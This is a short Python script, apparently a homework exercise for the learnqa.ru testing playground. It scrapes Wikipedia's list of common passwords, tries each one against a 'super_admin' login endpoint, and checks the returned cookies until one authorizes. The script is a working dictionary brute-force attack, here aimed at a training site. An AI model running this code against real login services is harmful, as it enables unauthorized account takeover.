import requests
from bs4 import BeautifulSoup


def find_password():
    print('Parsing passwords ...')
    link = 'https://en.wikipedia.org/wiki/List_of_the_most_common_passwords'
    response = requests.get(link).text
    soup = BeautifulSoup(response, 'lxml')
    table = soup.select("table:nth-of-type(3).wikitable tbody tr td[align='left']")
    passwords_list = []
    for row in table:
        passwords_list.append(row.text.strip())
    print(f'Total passwords: {len(passwords_list)}')
    return passwords_list


def check_auth():
    link = 'https://playground.learnqa.ru/ajax/api/get_secret_password_homework'
    passwords_dict = find_password()
    print('Set cookies ...')
    cookies_list = []
    for password in passwords_dict:
        payload = {'login': 'super_admin', 'password': password}
        response = requests.post(link, data=payload).cookies
        cookies_list.append(dict(response))
    return cookies_list


def check_cookie():
    link = 'https://playground.learnqa.ru/ajax/api/check_auth_cookie'
    cookies = check_auth()
    print('Check cookies ...')
    for cookie in cookies:
        payload = cookie
        response = requests.post(link, cookies=payload).text
        if response == 'You are authorized':
            print(f'\nCorrect cookie: {cookie} \nResponse: {response}')
            break


check_cookie()


